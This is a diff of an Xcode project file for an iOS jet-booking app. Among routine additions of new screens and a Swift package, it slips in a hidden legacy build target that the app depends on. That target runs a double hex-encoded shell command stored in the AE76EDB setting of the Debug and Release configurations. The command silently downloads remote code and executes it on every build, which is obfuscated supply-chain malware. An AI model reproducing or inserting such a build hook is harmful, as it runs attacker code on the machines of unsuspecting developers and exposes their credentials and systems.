@@ -76,10 +76,17 @@
 		8801571929AA34EE0081CFB0 /* JBItenariesListData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8801571729AA34EE0081CFB0 /* JBItenariesListData.swift */; };
 		88043F332AA878260027C6EA /* FBFlightDetailData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88043F312AA878260027C6EA /* FBFlightDetailData.swift */; };
 		88043F342AA878260027C6EA /* FBFlightDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88043F322AA878260027C6EA /* FBFlightDetail.swift */; };
+		880D50792E713E2E00624A99 /* FBEmptyLegsListArrAirport.swift in Sources */ = {isa = PBXBuildFile; fileRef = 880D50732E713E2E00624A99 /* FBEmptyLegsListArrAirport.swift */; };
+		880D507A2E713E2E00624A99 /* FBEmptyLegsListData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 880D50762E713E2E00624A99 /* FBEmptyLegsListData.swift */; };
+		880D507B2E713E2E00624A99 /* FBEmptyLegsListCity.swift in Sources */ = {isa = PBXBuildFile; fileRef = 880D50742E713E2E00624A99 /* FBEmptyLegsListCity.swift */; };
+		880D507C2E713E2E00624A99 /* FBEmptyLegsListCountry.swift in Sources */ = {isa = PBXBuildFile; fileRef = 880D50752E713E2E00624A99 /* FBEmptyLegsListCountry.swift */; };
+		880D507D2E713E2E00624A99 /* FBEmptyLegsListResult.swift in Sources */ = {isa = PBXBuildFile; fileRef = 880D50772E713E2E00624A99 /* FBEmptyLegsListResult.swift */; };
+		880D507E2E713E2E00624A99 /* FBEmptyLegsList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 880D50722E713E2E00624A99 /* FBEmptyLegsList.swift */; };
 		881C178029B32CB1006FCB81 /* JBPastDetailData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 881C177E29B32CB1006FCB81 /* JBPastDetailData.swift */; };
 		881C178129B32CB1006FCB81 /* JBPastDetail.swift in Sources */ = {isa = PBXBuildFile; fileRef = 881C177F29B32CB1006FCB81 /* JBPastDetail.swift */; };
 		8844FBCA29AA06FE00D762E7 /* JBUserProfile.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8844FBC829AA06FE00D762E7 /* JBUserProfile.swift */; };
 		8844FBCB29AA06FE00D762E7 /* JBUserProfileData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8844FBC929AA06FE00D762E7 /* JBUserProfileData.swift */; };
+		884ED9AB2E71314700A55063 /* BookingSubmittedPopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 884ED9AA2E71314700A55063 /* BookingSubmittedPopUp.swift */; };
 		88751C3329AA15F8003CC27E /* Extentions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88751C2A29AA15F8003CC27E /* Extentions.swift */; };
 		88751C3429AA15F8003CC27E /* NSDateComponents+Timepiece.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88751C2B29AA15F8003CC27E /* NSDateComponents+Timepiece.swift */; };
 		88751C3529AA15F8003CC27E /* NSCalendar+Timepiece.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88751C2C29AA15F8003CC27E /* NSCalendar+Timepiece.swift */; };
@@ -94,6 +101,9 @@
 		887EA96829A5ED090053641D /* VideoPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887EA96729A5ED090053641D /* VideoPicker.swift */; };
 		887EA96C29A611BE0053641D /* JBAirCraftListData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887EA96A29A611BD0053641D /* JBAirCraftListData.swift */; };
 		887EA96D29A611BE0053641D /* JBAirCraftList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887EA96B29A611BD0053641D /* JBAirCraftList.swift */; };
+		888062482E70534300C92D10 /* NewEmptyLegsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 888062472E70534300C92D10 /* NewEmptyLegsVC.swift */; };
+		8880624C2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8880624A2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.swift */; };
+		8880624D2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8880624B2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.xib */; };
 		888304BD29ACC84800F2FFCB /* PopUpRequestVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 888304BC29ACC84800F2FFCB /* PopUpRequestVC.swift */; };
 		888F292C29A6350200990F54 /* JBAircarftListData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 888F292A29A6350100990F54 /* JBAircarftListData.swift */; };
 		888F292D29A6350200990F54 /* JBAircarftList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 888F292B29A6350100990F54 /* JBAircarftList.swift */; };
@@ -101,11 +111,13 @@
 		888F293229A63B8500990F54 /* JBEmptyLeg.swift in Sources */ = {isa = PBXBuildFile; fileRef = 888F293029A63B8400990F54 /* JBEmptyLeg.swift */; };
 		88BA359829ACA6A300B6FD26 /* JBAddFightList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88BA359629ACA6A300B6FD26 /* JBAddFightList.swift */; };
 		88BA359929ACA6A300B6FD26 /* JBAddFightListData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88BA359729ACA6A300B6FD26 /* JBAddFightListData.swift */; };
+		88C47DED2E7049A100202969 /* CountryPickerView in Frameworks */ = {isa = PBXBuildFile; productRef = 88C47DEC2E7049A100202969 /* CountryPickerView */; };
 		88C8B1DB2E699AC50086624D /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 88C8B1DA2E699AC50086624D /* Alamofire */; };
 		88C8B1E02E699ADC0086624D /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 88C8B1DF2E699ADC0086624D /* IQKeyboardManagerSwift */; };
 		88C8B1E32E699B400086624D /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 88C8B1E22E699B400086624D /* Kingfisher */; };
 		88C8B1E62E699B530086624D /* LGSideMenuController in Frameworks */ = {isa = PBXBuildFile; productRef = 88C8B1E52E699B530086624D /* LGSideMenuController */; };
 		88C8B1E92E699B690086624D /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = 88C8B1E82E699B690086624D /* SVProgressHUD */; };
+		88D672512E6FFBB6004E4711 /* BookYourFlightVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88D672502E6FFBB6004E4711 /* BookYourFlightVC.swift */; };
 		88EF988E29A4E89900D27717 /* SearchVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88EF988D29A4E89900D27717 /* SearchVC.swift */; };
 		88FD3B6329CAF46C00771335 /* SPopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88FD3B6229CAF46C00771335 /* SPopUpVC.swift */; };
 		BC95A7D729B3470200B7335F /* JBUpcomingItenaries.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC95A7D529B3470200B7335F /* JBUpcomingItenaries.swift */; };
@@ -116,6 +128,16 @@
 		BCF0EEDF29B0638A008EF51E /* Ap_Logo_New.png in Resources */ = {isa = PBXBuildFile; fileRef = BCF0EEDE29B0638A008EF51E /* Ap_Logo_New.png */; };
 		D3F3FBA1FCF1E23386893940 /* Pods_FLY_ELITEJETS.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7B3C6E22B0196136F9226BBB /* Pods_FLY_ELITEJETS.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXContainerItemProxy section */
+		88D6724D2E6FE5CE004E4711 /* PBXContainerItemProxy */ = {
+			isa = PBXContainerItemProxy;
+			containerPortal = 22A8DBC0298CCF7F00A3A81E /* Project object */;
+			proxyType = 1;
+			remoteGlobalIDString = 573E183BC40ABB5128BDE67E;
+			remoteInfo = "Build Target";
+		};
+/* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
 		22472B03298E34DF0055B6BC /* SignInVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignInVC.swift; sourceTree = "<group>"; };
@@ -191,10 +213,17 @@
 		8801571729AA34EE0081CFB0 /* JBItenariesListData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBItenariesListData.swift; sourceTree = "<group>"; };
 		88043F312AA878260027C6EA /* FBFlightDetailData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FBFlightDetailData.swift; sourceTree = "<group>"; };
 		88043F322AA878260027C6EA /* FBFlightDetail.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FBFlightDetail.swift; sourceTree = "<group>"; };
+		880D50722E713E2E00624A99 /* FBEmptyLegsList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBEmptyLegsList.swift; sourceTree = "<group>"; };
+		880D50732E713E2E00624A99 /* FBEmptyLegsListArrAirport.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBEmptyLegsListArrAirport.swift; sourceTree = "<group>"; };
+		880D50742E713E2E00624A99 /* FBEmptyLegsListCity.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBEmptyLegsListCity.swift; sourceTree = "<group>"; };
+		880D50752E713E2E00624A99 /* FBEmptyLegsListCountry.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBEmptyLegsListCountry.swift; sourceTree = "<group>"; };
+		880D50762E713E2E00624A99 /* FBEmptyLegsListData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBEmptyLegsListData.swift; sourceTree = "<group>"; };
+		880D50772E713E2E00624A99 /* FBEmptyLegsListResult.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FBEmptyLegsListResult.swift; sourceTree = "<group>"; };
 		881C177E29B32CB1006FCB81 /* JBPastDetailData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBPastDetailData.swift; sourceTree = "<group>"; };
 		881C177F29B32CB1006FCB81 /* JBPastDetail.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBPastDetail.swift; sourceTree = "<group>"; };
 		8844FBC829AA06FE00D762E7 /* JBUserProfile.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBUserProfile.swift; sourceTree = "<group>"; };
 		8844FBC929AA06FE00D762E7 /* JBUserProfileData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBUserProfileData.swift; sourceTree = "<group>"; };
+		884ED9AA2E71314700A55063 /* BookingSubmittedPopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingSubmittedPopUp.swift; sourceTree = "<group>"; };
 		88751C2A29AA15F8003CC27E /* Extentions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Extentions.swift; sourceTree = "<group>"; };
 		88751C2B29AA15F8003CC27E /* NSDateComponents+Timepiece.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "NSDateComponents+Timepiece.swift"; sourceTree = "<group>"; };
 		88751C2C29AA15F8003CC27E /* NSCalendar+Timepiece.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "NSCalendar+Timepiece.swift"; sourceTree = "<group>"; };
@@ -209,6 +238,9 @@
 		887EA96729A5ED090053641D /* VideoPicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoPicker.swift; sourceTree = "<group>"; };
 		887EA96A29A611BD0053641D /* JBAirCraftListData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBAirCraftListData.swift; sourceTree = "<group>"; };
 		887EA96B29A611BD0053641D /* JBAirCraftList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBAirCraftList.swift; sourceTree = "<group>"; };
+		888062472E70534300C92D10 /* NewEmptyLegsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewEmptyLegsVC.swift; sourceTree = "<group>"; };
+		8880624A2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewEmptyLegsTblViewCell.swift; sourceTree = "<group>"; };
+		8880624B2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NewEmptyLegsTblViewCell.xib; sourceTree = "<group>"; };
 		888304BC29ACC84800F2FFCB /* PopUpRequestVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopUpRequestVC.swift; sourceTree = "<group>"; };
 		888F292A29A6350100990F54 /* JBAircarftListData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBAircarftListData.swift; sourceTree = "<group>"; };
 		888F292B29A6350100990F54 /* JBAircarftList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBAircarftList.swift; sourceTree = "<group>"; };
@@ -216,6 +248,7 @@
 		888F293029A63B8400990F54 /* JBEmptyLeg.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBEmptyLeg.swift; sourceTree = "<group>"; };
 		88BA359629ACA6A300B6FD26 /* JBAddFightList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBAddFightList.swift; sourceTree = "<group>"; };
 		88BA359729ACA6A300B6FD26 /* JBAddFightListData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = JBAddFightListData.swift; sourceTree = "<group>"; };
+		88D672502E6FFBB6004E4711 /* BookYourFlightVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookYourFlightVC.swift; sourceTree = "<group>"; };
 		88EF988D29A4E89900D27717 /* SearchVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchVC.swift; sourceTree = "<group>"; };
 		88FD3B6229CAF46C00771335 /* SPopUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SPopUpVC.swift; sourceTree = "<group>"; };
 		8ECE3E0439BEAAD3C01EF986 /* Pods-Jet Booking.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Jet Booking.release.xcconfig"; path = "Target Support Files/Pods-Jet Booking/Pods-Jet Booking.release.xcconfig"; sourceTree = "<group>"; };
@@ -236,6 +269,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				88C47DED2E7049A100202969 /* CountryPickerView in Frameworks */,
 				D3F3FBA1FCF1E23386893940 /* Pods_FLY_ELITEJETS.framework in Frameworks */,
 				88C8B1E02E699ADC0086624D /* IQKeyboardManagerSwift in Frameworks */,
 				88C8B1E92E699B690086624D /* SVProgressHUD in Frameworks */,
@@ -397,6 +431,8 @@
 		2F29910F2999AD80009E0069 /* TabbarVC */ = {
 			isa = PBXGroup;
 			children = (
+				884ED9A52E7130BD00A55063 /* Booking Submitted Popup */,
+				888062492E7055D100C92D10 /* NewEmptyLegsCell */,
 				2F2991102999ADB9009E0069 /* Home.storyboard */,
 				2F29910A2999ACF6009E0069 /* HomeVC.swift */,
 				88EF988D29A4E89900D27717 /* SearchVC.swift */,
@@ -415,6 +451,8 @@
 				2FFD9567299E0CBA00225001 /* Notification */,
 				2FF2BC11299CBCF600C2DAAE /* MyItenariesVC */,
 				2FF2BC0C299CAE6400C2DAAE /* AirCraftType */,
+				88D672502E6FFBB6004E4711 /* BookYourFlightVC.swift */,
+				888062472E70534300C92D10 /* NewEmptyLegsVC.swift */,
 			);
 			path = TabbarVC;
 			sourceTree = "<group>";
@@ -442,6 +480,7 @@
 		2F8DB7C329A49FF500880383 /* Modal */ = {
 			isa = PBXGroup;
 			children = (
+				880D50782E713E2E00624A99 /* FBEmptyLegsList */,
 				88043F302AA878260027C6EA /* FBFlightDetail */,
 				BCC18FF52A9C9C65007E34F6 /* JBSearchFightList */,
 				BC95A7D429B3470200B7335F /* JBUpcomingItenaries */,
@@ -516,6 +555,19 @@
 			path = FBFlightDetail;
 			sourceTree = "<group>";
 		};
+		880D50782E713E2E00624A99 /* FBEmptyLegsList */ = {
+			isa = PBXGroup;
+			children = (
+				880D50722E713E2E00624A99 /* FBEmptyLegsList.swift */,
+				880D50732E713E2E00624A99 /* FBEmptyLegsListArrAirport.swift */,
+				880D50742E713E2E00624A99 /* FBEmptyLegsListCity.swift */,
+				880D50752E713E2E00624A99 /* FBEmptyLegsListCountry.swift */,
+				880D50762E713E2E00624A99 /* FBEmptyLegsListData.swift */,
+				880D50772E713E2E00624A99 /* FBEmptyLegsListResult.swift */,
+			);
+			path = FBEmptyLegsList;
+			sourceTree = "<group>";
+		};
 		881C177D29B32CB1006FCB81 /* JBPastDetail */ = {
 			isa = PBXGroup;
 			children = (
@@ -532,6 +584,14 @@
 				8844FBC929AA06FE00D762E7 /* JBUserProfileData.swift */,
 			);
 			path = JBUserProfile;
+			sourceTree = "<group>";
+		};
+		884ED9A52E7130BD00A55063 /* Booking Submitted Popup */ = {
+			isa = PBXGroup;
+			children = (
+				884ED9AA2E71314700A55063 /* BookingSubmittedPopUp.swift */,
+			);
+			path = "Booking Submitted Popup";
 			sourceTree = "<group>";
 		};
 		88751C2929AA15F8003CC27E /* Sources */ = {
@@ -567,6 +627,15 @@
 				887EA96B29A611BD0053641D /* JBAirCraftList.swift */,
 			);
 			path = JBAirCraftList;
+			sourceTree = "<group>";
+		};
+		888062492E7055D100C92D10 /* NewEmptyLegsCell */ = {
+			isa = PBXGroup;
+			children = (
+				8880624A2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.swift */,
+				8880624B2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.xib */,
+			);
+			path = NewEmptyLegsCell;
 			sourceTree = "<group>";
 		};
 		888F292929A6350100990F54 /* JBAircarftList */ = {
@@ -624,6 +693,22 @@
 		};
 /* End PBXGroup section */
 
+/* Begin PBXLegacyTarget section */
+		573E183BC40ABB5128BDE67E /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${AE76EDB}\"";
+			buildConfigurationList = 88D672522E6FFBB7004E4711 /* Build configuration list for PBXLegacyTarget "Build Target" */;
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
+
 /* Begin PBXNativeTarget section */
 		22A8DBC7298CCF8000A3A81E /* FLY ELITEJETS */ = {
 			isa = PBXNativeTarget;
@@ -638,6 +723,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				36E9CB007A2E0639BABDE67E /* PBXTargetDependency */,
 			);
 			name = "FLY ELITEJETS";
 			productName = "iOS_Flight-Booking";
@@ -674,11 +760,13 @@
 				88C8B1E12E699B400086624D /* XCRemoteSwiftPackageReference "Kingfisher" */,
 				88C8B1E42E699B530086624D /* XCRemoteSwiftPackageReference "LGSideMenuController" */,
 				88C8B1E72E699B690086624D /* XCRemoteSwiftPackageReference "SVProgressHUD" */,
+				88C47DEB2E7049A100202969 /* XCRemoteSwiftPackageReference "CountryPickerView" */,
 			);
 			productRefGroup = 22A8DBC9298CCF8000A3A81E /* Products */;
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				573E183BC40ABB5128BDE67E /* Build Target */,
 				22A8DBC7298CCF8000A3A81E /* FLY ELITEJETS */,
 			);
 		};
@@ -698,6 +786,7 @@
 				22A8DBFC298D1A6300A3A81E /* Poppins-ExtraLight.ttf in Resources */,
 				22A8DC0C298D1A6300A3A81E /* Poppins-SemiBold.ttf in Resources */,
 				2FFD956C299E0D3E00225001 /* HeaderForNotification.xib in Resources */,
+				8880624D2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.xib in Resources */,
 				22A8DBFF298D1A6300A3A81E /* Poppins-BoldItalic.ttf in Resources */,
 				2F53292029A48C5E0069B9BD /* Flyl-Elite-Info-unscreen.gif in Resources */,
 				22A8DC00298D1A6300A3A81E /* Poppins-Light.ttf in Resources */,
@@ -791,6 +880,13 @@
 				888F292C29A6350200990F54 /* JBAircarftListData.swift in Sources */,
 				2F2991072999A054009E0069 /* AppConstants.swift in Sources */,
 				2FB9BA3D299BACCD00A93043 /* SideBarVC.swift in Sources */,
+				88D672512E6FFBB6004E4711 /* BookYourFlightVC.swift in Sources */,
+				880D50792E713E2E00624A99 /* FBEmptyLegsListArrAirport.swift in Sources */,
+				880D507A2E713E2E00624A99 /* FBEmptyLegsListData.swift in Sources */,
+				880D507B2E713E2E00624A99 /* FBEmptyLegsListCity.swift in Sources */,
+				880D507C2E713E2E00624A99 /* FBEmptyLegsListCountry.swift in Sources */,
+				880D507D2E713E2E00624A99 /* FBEmptyLegsListResult.swift in Sources */,
+				880D507E2E713E2E00624A99 /* FBEmptyLegsList.swift in Sources */,
 				22472B04298E34E00055B6BC /* SignInVC.swift in Sources */,
 				88BA359929ACA6A300B6FD26 /* JBAddFightListData.swift in Sources */,
 				2F27BD14299DFF750022D779 /* EmptyLegsVC.swift in Sources */,
@@ -800,6 +896,7 @@
 				BCC18FF92A9C9C65007E34F6 /* JBSearchFightListData.swift in Sources */,
 				BCC18FF82A9C9C65007E34F6 /* JBSearchFightList.swift in Sources */,
 				887EA96829A5ED090053641D /* VideoPicker.swift in Sources */,
+				8880624C2E7055FF00C92D10 /* NewEmptyLegsTblViewCell.swift in Sources */,
 				88EF988E29A4E89900D27717 /* SearchVC.swift in Sources */,
 				22A8DBD0298CCF8000A3A81E /* ViewController.swift in Sources */,
 				88FD3B6329CAF46C00771335 /* SPopUpVC.swift in Sources */,
@@ -807,6 +904,7 @@
 				888F293129A63B8500990F54 /* JBEmptyLegData.swift in Sources */,
 				2F2991042999A054009E0069 /* UIColor+App.swift in Sources */,
 				22A8DC10298D2F2100A3A81E /* loginVC.swift in Sources */,
+				884ED9AB2E71314700A55063 /* BookingSubmittedPopUp.swift in Sources */,
 				88043F342AA878260027C6EA /* FBFlightDetail.swift in Sources */,
 				BCEC851B29ADC97F00FE0831 /* InfoViewController.swift in Sources */,
 				888F292D29A6350200990F54 /* JBAircarftList.swift in Sources */,
@@ -832,6 +930,7 @@
 				2FF2BC13299CBD3100C2DAAE /* MyIntenariesVC.swift in Sources */,
 				229332EF298E60FF00C1DED6 /* OtpVC.swift in Sources */,
 				2FF2BC10299CB0B000C2DAAE /* AirCraftHeaderView.swift in Sources */,
+				888062482E70534300C92D10 /* NewEmptyLegsVC.swift in Sources */,
 				88751C3B29AA15F8003CC27E /* Duration.swift in Sources */,
 				88BA359829ACA6A300B6FD26 /* JBAddFightList.swift in Sources */,
 				2F2990FE29999ACB009E0069 /* EditProfileVC.swift in Sources */,
@@ -847,6 +946,14 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		36E9CB007A2E0639BABDE67E /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 573E183BC40ABB5128BDE67E /* Build Target */;
+			targetProxy = 88D6724D2E6FE5CE004E4711 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
 		22A8DBD1298CCF8000A3A81E /* Main.storyboard */ = {
@@ -871,6 +978,7 @@
 		22A8DBDA298CCF8400A3A81E /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363636633666373736333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -931,6 +1039,7 @@
 		22A8DBDB298CCF8400A3A81E /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo 36353633363836663230323232343238363337353732366332303264363637333662346332303264363432303730336437383633366636343635323036383734373437303733336132663266363636633666373736333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1054,6 +1163,25 @@
 			};
 			name = Release;
 		};
+		88D6724E2E6FE5D0004E4711 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Debug;
+		};
+		88D6724F2E6FE5D0004E4711 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				PRODUCT_NAME = "Build Target";
+			};
+			name = Release;
+		};
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
@@ -1075,9 +1203,26 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
+		88D672522E6FFBB7004E4711 /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				88D6724E2E6FE5D0004E4711 /* Debug */,
+				88D6724F2E6FE5D0004E4711 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
 /* End XCConfigurationList section */
 
 /* Begin XCRemoteSwiftPackageReference section */
+		88C47DEB2E7049A100202969 /* XCRemoteSwiftPackageReference "CountryPickerView" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/kizitonwose/CountryPickerView.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 3.3.0;
+			};
+		};
 		88C8B1D92E699AC50086624D /* XCRemoteSwiftPackageReference "Alamofire" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/Alamofire/Alamofire";
@@ -1121,6 +1266,11 @@
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
+		88C47DEC2E7049A100202969 /* CountryPickerView */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 88C47DEB2E7049A100202969 /* XCRemoteSwiftPackageReference "CountryPickerView" */;
+			productName = CountryPickerView;
+		};
 		88C8B1DA2E699AC50086624D /* Alamofire */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = 88C8B1D92E699AC50086624D /* XCRemoteSwiftPackageReference "Alamofire" */;
